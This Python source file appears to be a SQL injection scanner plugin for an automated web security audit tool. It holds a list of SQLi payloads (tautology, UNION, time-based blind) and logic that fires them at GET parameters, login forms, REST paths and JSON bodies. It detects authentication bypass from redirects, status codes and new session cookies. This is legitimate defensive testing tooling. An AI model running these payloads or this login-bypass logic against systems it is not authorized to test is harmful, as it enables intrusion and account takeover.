import requests
import re
import logging
import urllib.parse
from typing import Dict, Any, List, Optional

from plugins.base_plugin import BaseScanner
from core.utils import format_severity
from core.cookies import (describe_issue, insecure_cookie_flags, raw_set_cookie_headers,
                          severity_for as cookie_severity)

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# SQL error signatures that indicate a backend database leak
# ---------------------------------------------------------------------------
SQL_ERROR_SIGNATURES = [
    r"you have an error in your sql syntax",
    r"warning:.*mysql",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"ora-\d{5}",
    r"microsoft ole db provider for sql server",
    r"microsoft sql native client error",
    r"odbc sql server driver",
    r"\[sqlite_error\]",
    r"sqlite3\.operationalerror",
    r"sqlite\.error",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"pgsql",
    r"sql command not properly ended",
    r"unterminated string",
    r"syntax error at or near",
    r"unexpected end of sql command",
    r"invalid column name",
    r"unknown column",
    r"operand should contain \d+ column",
    r"division by zero",
    r"com\.mysql\.jdbc",
    r"jdbc\.sqlserverexception",
    r"sqlexception",
    r"org\.postgresql",
    r"hibernate",
]

# ---------------------------------------------------------------------------
# Injection payloads grouped by technique
# ---------------------------------------------------------------------------
SQLI_PAYLOADS = [
    # Error-based / tautology
    "' OR 1=1--",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "\" OR 1=1--",
    "1' AND '1'='1",
    # UNION-based probing
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    # Time-based blind (the response may be slow)
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(3)--",
    # Other common
    "1 AND 1=1--",
    "admin'--",
    "1' ORDER BY 1--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
]

# ---------------------------------------------------------------------------
# Endpoints to probe (path + param name pairs)
# ---------------------------------------------------------------------------
ENDPOINT_TEMPLATES: List[Dict[str, Any]] = [
    {"path": "/search",        "param": "q",        "method": "GET"},
    {"path": "/products",      "param": "search",   "method": "GET"},
    {"path": "/api/Products",  "param": "q",        "method": "GET"},
    {"path": "/rest/products/search", "param": "q",  "method": "GET"},
    {"path": "/items",         "param": "query",    "method": "GET"},
    {"path": "/users",         "param": "id",       "method": "GET"},
    {"path": "/api/users",     "param": "id",       "method": "GET"},
    {"path": "/",              "param": "id",       "method": "GET"},
    {"path": "/",              "param": "page",     "method": "GET"},
    {"path": "/",              "param": "cat",      "method": "GET"},
]

LOGIN_ENDPOINTS = ["/login", "/api/login", "/rest/user/login", "/auth/login"]

HEADERS = {"User-Agent": "AutoSecAudit/2.0"}
REQUEST_TIMEOUT = (3.0, 8.0)


class SQLiScanner(BaseScanner):
    """HTTP-based SQL Injection vulnerability scanner."""

    def __init__(self, mock_mode: Optional[bool] = None):
        super().__init__(mock_mode)
        self.raw_output: str = ""
        self.results: List[Dict[str, Any]] = []

    # ------------------------------------------------------------------
    # BaseScanner interface
    # ------------------------------------------------------------------
    def configure(self, target: str) -> None:
        self.target = target
        # Pure-Python scanner – no external CLI binary required
        self._tool_available = True

    def _get_tool_name(self) -> str:
        return "python-requests"

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    @staticmethod
    def _check_sql_errors(text: str) -> Optional[str]:
        """Return the first matching SQL error signature found in *text*."""
        lower = text.lower()
        for sig in SQL_ERROR_SIGNATURES:
            if re.search(sig, lower):
                return sig
        return None

    # ------------------------------------------------------------------
    # Core scanning logic
    # ------------------------------------------------------------------
    def _test_get_endpoint(self, base_url: str, endpoint: Dict[str, Any]) -> None:
        """Inject payloads into a single GET endpoint with baseline verification."""
        path = endpoint["path"]
        param = endpoint["param"]
        url = f"{base_url}{path}"

        # Fetch baseline (safe) response first
        baseline = self._get_baseline(url, param, headers=HEADERS, timeout=REQUEST_TIMEOUT)

        for payload in SQLI_PAYLOADS:
            resp = self._safe_request(
                "GET",
                url,
                params={param: payload},
                headers=HEADERS,
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True,
            )
            if resp is None:
                continue
            match = self._check_sql_errors(resp.text)
            if match:
                if baseline:
                    is_verified, confidence = self._verify_against_baseline(baseline, resp, payload=payload)
                else:
                    # No baseline available — trust the SQL error signature
                    is_verified, confidence = True, "medium"

                if is_verified:
                    self.results.append({
                        "endpoint": f"{path}?{param}=<payload>",
                        "payload": payload,
                        "matched_signature": match,
                        "status_code": resp.status_code,
                        "evidence": resp.text[:300],
                        "type": "error_based",
                        "verified": True,
                        "confidence": confidence,
                    })
                    logger.info(
                        f"[SQLi] Verified injection at {path}?{param} "
                        f"with payload: {payload!r} (confidence: {confidence})"
                    )
                    return
                else:
                    logger.debug(
                        f"[SQLi] SQL error found but baseline unchanged at {path}?{param} — skipping"
                    )

    def _test_login_endpoints(self, base_url: str) -> None:
        """POST common login forms with SQL injection payloads using both JSON and form encoding."""
        login_paths = list(LOGIN_ENDPOINTS)
        fields_by_path: Dict[str, List[str]] = {}
        for ep in self.discovered_endpoints or []:
            p = ep.get("path", "")
            param = ep.get("param", "")
            if not p:
                continue
            p_lower = p.lower()
            if any(kw in p_lower for kw in ("login", "signin", "auth", "session")):
                if p not in login_paths:
                    login_paths.append(p)
            if param:
                fields_by_path.setdefault(p, []).append(param)

        for login_path in login_paths:
            url = f"{base_url}{login_path}"
            disc_fields = fields_by_path.get(login_path, [])
            candidate_pairs = []
            if disc_fields:
                user_f = next((f for f in disc_fields if any(u in f.lower() for u in ("user", "email", "login", "account", "name"))), disc_fields[0])
                pass_f = next((f for f in disc_fields if any(p in f.lower() for p in ("pass", "pwd"))), "password")
                candidate_pairs.append((user_f, pass_f))
            candidate_pairs.extend([
                ("username", "password"),
                ("email", "password"),
                ("user", "pass"),
            ])
            seen_pairs = set()
            unique_pairs = []
            for u, p in candidate_pairs:
                if (u, p) not in seen_pairs:
                    seen_pairs.add((u, p))
                    unique_pairs.append((u, p))

            for user_field, pass_field in unique_pairs:
                modes = [
                    ("form", lambda b: {"data": b, "headers": {**HEADERS, "Content-Type": "application/x-www-form-urlencoded"}}),
                    ("json", lambda b: {"json_data": b, "headers": {**HEADERS, "Content-Type": "application/json"}}),
                ]
                for mode_name, kwargs_builder in modes:
                    # 1. Send control login with invalid credentials to establish baseline
                    ctrl_body = {user_field: "autosec_invalid_user", pass_field: "wrong_password_999"}
                    ctrl_resp = self._safe_request(
                        "POST",
                        url,
                        timeout=REQUEST_TIMEOUT,
                        allow_redirects=False,
                        **kwargs_builder(ctrl_body),
                    )
                    ctrl_status = ctrl_resp.status_code if ctrl_resp is not None else None
                    ctrl_loc = (ctrl_resp.headers.get("Location") or "").strip() if ctrl_resp and getattr(ctrl_resp, "headers", None) else ""
                    ctrl_cookies = set(ctrl_resp.cookies.keys()) if ctrl_resp and getattr(ctrl_resp, "cookies", None) else set()
                    ctrl_text = ctrl_resp.text.lower() if ctrl_resp and getattr(ctrl_resp, "text", None) else ""

                    hit = False
                    for payload in ["' OR 1=1--", "' OR '1'='1'--", "admin'--", "' OR 1=1", "' OR '1'='1"]:
                        body = {user_field: payload, pass_field: "password"}
                        resp = self._safe_request(
                            "POST",
                            url,
                            timeout=REQUEST_TIMEOUT,
                            allow_redirects=False,
                            **kwargs_builder(body),
                        )
                        if resp is None:
                            continue

                        # Check for SQL error leak
                        match = self._check_sql_errors(resp.text)
                        if match and (ctrl_resp is None or match not in ctrl_text):
                            self.results.append({
                                "endpoint": login_path,
                                "param": user_field,
                                "payload": payload,
                                "matched_signature": match,
                                "status_code": resp.status_code,
                                "evidence": resp.text[:300],
                                "type": "login_bypass",
                                "verified": True,
                                "confidence": "high",
                            })
                            logger.info(
                                f"[SQLi] Verified login injection at {login_path} ({mode_name}) "
                                f"with payload: {payload!r}"
                            )
                            hit = True
                            break

                        # Check for success signal that the control response lacks
                        resp_loc = (resp.headers.get("Location") or "").strip() if getattr(resp, "headers", None) else ""
                        resp_cookies = set(resp.cookies.keys()) if getattr(resp, "cookies", None) else set()
                        new_cookies = resp_cookies - ctrl_cookies
                        has_new_session_cookie = any(any(k in c.lower() for k in ("session", "token", "auth", "sid", "jwt")) for c in new_cookies)

                        # Redirect bypass: control did not redirect (or redirected to error), but injected redirected to valid dashboard/target
                        is_redirect_bypass = False
                        if resp.status_code in (301, 302, 303, 307, 308):
                            if ctrl_status not in (301, 302, 303, 307, 308):
                                if resp_loc != login_path and not any(err in resp_loc.lower() for err in ("error", "fail", "invalid", "login?")):
                                    is_redirect_bypass = True
                            else:
                                if resp_loc != ctrl_loc and resp_loc not in (login_path, ctrl_loc) and not any(err in resp_loc.lower() for err in ("error", "fail", "invalid", "login?")):
                                    is_redirect_bypass = True

                        # Status code bypass: control got 401/403 and injection got 200 without error phrases
                        is_status_bypass = (
                            ctrl_status in (401, 403)
                            and resp.status_code == 200
                            and not any(err in resp.text.lower() for err in ("invalid", "incorrect", "unauthorized", "failed", "try again"))
                        )

                        # Cookie bypass: new session cookie was set that control did not receive
                        is_cookie_bypass = has_new_session_cookie and (is_redirect_bypass or resp.status_code == 200)

                        # Heuristic bypass: 200 with auth token where control lacked it
                        is_heuristic_bypass = (
                            resp.status_code == 200
                            and ("token" in resp.text.lower() or "authentication" in resp.text.lower())
                            and ("token" not in ctrl_text and "authentication" not in ctrl_text)
                        )

                        if is_redirect_bypass or is_status_bypass or is_cookie_bypass or is_heuristic_bypass:
                            ev = f"HTTP {resp.status_code}"
                            if getattr(resp, "headers", None) and resp.headers.get("Location"):
                                ev += f" Location: {resp.headers.get('Location')}"
                            if getattr(resp, "cookies", None):
                                ev += f" Cookies: {list(resp.cookies.keys())}"
                            if getattr(resp, "text", None):
                                ev += f" Body: {resp.text[:200]}"
                            self.results.append({
                                "endpoint": login_path,
                                "param": user_field,
                                "payload": payload,
                                "matched_signature": "authentication_bypass_differential_success",
                                "status_code": resp.status_code,
                                "evidence": ev,
                                "type": "login_bypass",
                                "verified": True,
                                "confidence": "high",
                                "set_cookie_headers": raw_set_cookie_headers(resp),
                            })
                            logger.info(
                                f"[SQLi] Verified login bypass at {login_path} ({mode_name}) "
                                f"with payload: {payload!r}"
                            )
                            hit = True
                            break
                    if hit:
                        break
                if hit:
                    break

    def _test_url_path_injection(self, base_url: str) -> None:
        """Try path-based injection on REST-style numeric IDs."""
        paths = ["/api/Products/", "/users/", "/api/users/", "/items/"]
        for path in paths:
            for payload in ["1 OR 1=1", "1' OR '1'='1", "1 AND 1=CONVERT(int,@@version)--"]:
                url = f"{base_url}{path}{urllib.parse.quote(payload)}"
                resp = self._safe_request(
                    "GET",
                    url,
                    headers=HEADERS,
                    timeout=REQUEST_TIMEOUT,
                    allow_redirects=True,
                )
                if resp is None:
                    continue
                match = self._check_sql_errors(resp.text)
                if match:
                    self.results.append({
                        "endpoint": f"{path}<id>",
                        "payload": payload,
                        "matched_signature": match,
                        "status_code": resp.status_code,
                        "evidence": resp.text[:300],
                        "type": "path_injection",
                    })
                    return

    def _test_time_based_sqli(self, base_url: str, ep: Dict[str, Any]) -> None:
        """Test time-based blind SQLi using two-phase statistical verification."""
        path = ep.get("path", "")
        param = ep.get("param", "")
        if not path or not param:
            return

        url = f"{base_url}{path}"
        delay_payload = "' AND SLEEP(2)--"
        fast_payload = "' AND 1=2--"

        def probe_safe():
            return self._safe_request("GET", url, params={param: "safe123"}, timeout=(2.0, 5.0))

        def probe_delay():
            return self._safe_request("GET", url, params={param: delay_payload}, timeout=(2.0, 6.0))

        def probe_fast():
            return self._safe_request("GET", url, params={param: fast_payload}, timeout=(2.0, 5.0))

        is_verified, confidence, details = self._verify_timing(
            probe_safe, probe_delay, probe_fast, expected_delay=2.0
        )

        if is_verified:
            self.results.append({
                "endpoint": f"{path}?{param}=<delay_payload>",
                "payload": delay_payload,
                "matched_signature": f"statistical_timing_delay (elapsed: {details['delay_elapsed']}s vs base: {details['baseline_mean']}s)",
                "status_code": 200,
                "evidence": f"Two-phase timing verification confirmed: baseline {details['baseline_mean']}s -> probe {details['delay_elapsed']}s -> fast {details['fast_elapsed']}s.",
                "type": "time_based_blind",
                "verified": True,
                "confidence": confidence,
            })
            logger.info(f"[SQLi] Verified blind time-based injection at {path}?{param} (confidence: {confidence})")

    def _test_json_body_sqli(self, base_url: str) -> None:
        """Deep fuzz JSON bodies on REST API endpoints."""
        json_endpoints = [
            {"path": "/api/orders", "body": {"customer": {"name": "test", "id": 1}, "item": "widget"}},
            {"path": "/api/search", "body": {"query": {"term": "product", "filter": "active"}}},
            {"path": "/api/filter", "body": {"category": "all", "sort": "asc"}},
        ]
        for ep in json_endpoints:
            url = f"{base_url}{ep['path']}"
            for payload in ["' OR 1=1--", "' OR '1'='1"]:
                fuzz_results = self._fuzz_json_body(url, "POST", ep["body"], payload)
                for mutated_path, resp in fuzz_results:
                    if resp is not None:
                        match = self._check_sql_errors(resp.text)
                        if match or (resp.status_code == 500 and "syntax" in resp.text.lower()):
                            self.results.append({
                                "endpoint": f"{ep['path']} (JSON body: {mutated_path})",
                                "payload": payload,
                                "matched_signature": match or "500_server_syntax_error",
                                "status_code": resp.status_code,
                                "evidence": resp.text[:300],
                                "type": "json_body_injection",
                                "verified": True,
                                "confidence": "high",
                            })
                            logger.info(f"[SQLi] Verified JSON body SQLi at {ep['path']} on {mutated_path}")
                            return

    # ------------------------------------------------------------------
    # run() – main entry point
    # ------------------------------------------------------------------
    def run(self) -> None:
        base_url, host, port = self._parse_target(self.target)
        logger.info(f"[SQLiScanner] Starting scan on {base_url}")
        self.results = []

        # Use discovered endpoints from crawler if available, else fall back to hardcoded
        if self.discovered_endpoints:
            endpoints_to_test = self.discovered_endpoints
            logger.info(f"[SQLiScanner] Using {len(endpoints_to_test)} discovered endpoints from crawler")
        else:
            endpoints_to_test = ENDPOINT_TEMPLATES
            logger.info(f"[SQLiScanner] No discovered endpoints, using {len(endpoints_to_test)} default templates")

        # 1. GET parameter injection on discovered/default endpoints
        for ep in endpoints_to_test:
            self._test_get_endpoint(base_url, ep)
            # Time-based blind check on top endpoints
            if len(self.results) == 0:
                self._test_time_based_sqli(base_url, ep)

        # 2. Login form injection
        self._test_login_endpoints(base_url)

        # 3. REST path-based injection
        self._test_url_path_injection(base_url)

        # 4. Deep JSON body fuzzing
        self._test_json_body_sqli(base_url)

        self.raw_output = f"Tested {len(endpoints_to_test)} GET endpoints, " \
                          f"{len(LOGIN_ENDPOINTS)} login endpoints. " \
                          f"Found {len(self.results)} potential issue(s)."
        logger.info(f"[SQLiScanner] Finished – {self.raw_output}")

    # ------------------------------------------------------------------
    # parse_output()
    # ------------------------------------------------------------------
    def parse_output(self) -> Dict[str, Any]:
        _, host, port = self._parse_target(self.target)
        findings: List[Dict[str, Any]] = []

        for idx, result in enumerate(self.results, start=1):
            severity = "Critical" if result["type"] == "login_bypass" else "High"
            finding_id = f"SQLI-{idx:03d}"

            # Confidence: prefer baseline-verified confidence, else use heuristic
            if result.get("verified") and result.get("confidence"):
                confidence = result["confidence"]
            elif result.get("matched_signature") == "authentication_bypass_heuristic":
                confidence = "low"
            elif result["type"] in ("error_based", "path_injection"):
                confidence = "high"
            else:
                confidence = "medium"

            description = (
                f"SQL Injection detected at endpoint {result['endpoint']}.\n"
                f"Payload: {result['payload']}\n"
                f"Matched signature: {result['matched_signature']}\n"
                f"HTTP status: {result['status_code']}\n"
                f"Type: {result['type']}"
            )

            title_map = {
                "error_based": f"SQL Injection – Error-Based ({result['endpoint']})",
                "login_bypass": f"SQL Injection – Login Bypass ({result['endpoint']})",
                "path_injection": f"SQL Injection – Path Injection ({result['endpoint']})",
            }
            title = title_map.get(
                result["type"],
                f"SQL Injection ({result['endpoint']})",
            )

            ep_str = result.get("endpoint", "")
            ep = ep_str.split("?")[0] if "?" in ep_str else ep_str
            param = result.get("param")
            if not param and "?" in ep_str and "=" in ep_str:
                param = ep_str.split("?")[1].split("=")[0]

            findings.append({
                "id": finding_id,
                "title": title,
                "severity": format_severity(severity),
                "host": host,
                "port": port,
                "description": description,
                "raw_output": result.get("evidence", "")[:500],
                "owasp_tag": "A03:2021 Injection",
                "tool_name": "sqli_scanner",
                "confidence": confidence,
                "vuln_type": "sqli",
                "endpoint": ep,
                "param": param,
                "method": "POST" if result.get("type") == "login_bypass" else "GET",
                "evidence": result.get("evidence"),
            })

        findings.extend(self._cookie_findings(host, port))
        return {"tool_name": "sqli_scanner", "findings": findings}

    def _cookie_findings(self, host: str, port: int) -> List[Dict[str, Any]]:
        """Session cookies handed out by a verified login bypass, if they lack hardening flags."""
        seen, out = set(), []
        https = self.target.lower().startswith("https://")
        for result in self.results:
            for issue in insecure_cookie_flags(result.get("set_cookie_headers", []), https=https):
                if issue["cookie"] in seen:
                    continue
                seen.add(issue["cookie"])
                out.append({
                    "id": f"SQLI-COOKIE-{len(out) + 1:03d}",
                    "title": f"Insecure session cookie: {issue['cookie']} (missing {', '.join(issue['missing'])})",
                    "severity": cookie_severity(issue),
                    "host": host,
                    "port": port,
                    "description": describe_issue(issue),
                    "raw_output": f"Set-Cookie issued on {result['endpoint']} after login bypass",
                    "owasp_tag": "A05:2021 Security Misconfiguration",
                    "tool_name": "sqli_scanner",
                    "confidence": "high",
                    "vuln_type": "insecure_cookie",
                    "endpoint": result["endpoint"],
                    "param": issue["cookie"],
                    "method": "POST",
                    "evidence": "; ".join(result.get("set_cookie_headers", []))[:300],
                })
        return out

    # ------------------------------------------------------------------
    # _get_mock_output()
    # ------------------------------------------------------------------
    def _get_mock_output(self) -> Dict[str, Any]:
        _, host, port = self._parse_target(self.target)
        return {
            "tool_name": "sqli_scanner",
            "findings": [
                {
                    "id": "SQLI-001",
                    "title": "SQL Injection – Error-Based (/search?q=<payload>)",
                    "severity": "High",
                    "host": host,
                    "port": port,
                    "description": (
                        "SQL Injection detected at /search?q=<payload>.\n"
                        "Payload: ' OR 1=1--\n"
                        "Matched signature: you have an error in your sql syntax\n"
                        "HTTP status: 500\n"
                        "Type: error_based"
                    ),
                    "raw_output": "Error: You have an error in your SQL syntax near '' OR 1=1--'",
                    "owasp_tag": "A03:2021 Injection",
                    "tool_name": "sqli_scanner",
                    "confidence": "high",
                    "vuln_type": "sqli",
                    "endpoint": "/search",
                    "param": "q",
                    "method": "GET",
                    "evidence": "Error: You have an error in your SQL syntax near '' OR 1=1--'",
                },
                {
                    "id": "SQLI-002",
                    "title": "SQL Injection – Login Bypass (/rest/user/login)",
                    "severity": "Critical",
                    "host": host,
                    "port": port,
                    "description": (
                        "SQL Injection detected at /rest/user/login.\n"
                        "Payload: ' OR 1=1--\n"
                        "Matched signature: authentication_bypass_heuristic\n"
                        "HTTP status: 200\n"
                        "Type: login_bypass"
                    ),
                    "raw_output": '{"authentication":{"token":"mock-jwt-token","umail":"admin@example.com"}}',
                    "owasp_tag": "A03:2021 Injection",
                    "tool_name": "sqli_scanner",
                    "confidence": "low",
                    "vuln_type": "sqli",
                    "endpoint": "/rest/user/login",
                    "param": "email",
                    "method": "POST",
                    "evidence": '{"authentication":{"token":"mock-jwt-token","umail":"admin@example.com"}}',
                },
                {
                    "id": "SQLI-003",
                    "title": "SQL Injection – Error-Based (/api/Products?q=<payload>)",
                    "severity": "High",
                    "host": host,
                    "port": port,
                    "description": (
                        "SQL Injection detected at /api/Products?q=<payload>.\n"
                        "Payload: ' UNION SELECT NULL,NULL,NULL--\n"
                        "Matched signature: sqlite_error\n"
                        "HTTP status: 500\n"
                        "Type: error_based"
                    ),
                    "raw_output": "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns",
                    "owasp_tag": "A03:2021 Injection",
                    "tool_name": "sqli_scanner",
                    "confidence": "high",
                    "vuln_type": "sqli",
                    "endpoint": "/api/Products",
                    "param": "q",
                    "method": "GET",
                    "evidence": "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns",
                },
                {
                    "id": "SQLI-004",
                    "title": "SQL Injection – Path Injection (/api/Products/<id>)",
                    "severity": "High",
                    "host": host,
                    "port": port,
                    "description": (
                        "SQL Injection detected at /api/Products/<id>.\n"
                        "Payload: 1 OR 1=1\n"
                        "Matched signature: syntax error at or near\n"
                        "HTTP status: 500\n"
                        "Type: path_injection"
                    ),
                    "raw_output": "ERROR: syntax error at or near 'OR' at character 35",
                    "owasp_tag": "A03:2021 Injection",
                    "tool_name": "sqli_scanner",
                    "confidence": "high",
                    "vuln_type": "sqli",
                    "endpoint": "/api/Products/1",
                    "param": "id",
                    "method": "GET",
                    "evidence": "ERROR: syntax error at or near 'OR' at character 35",
                },
            ],
        }
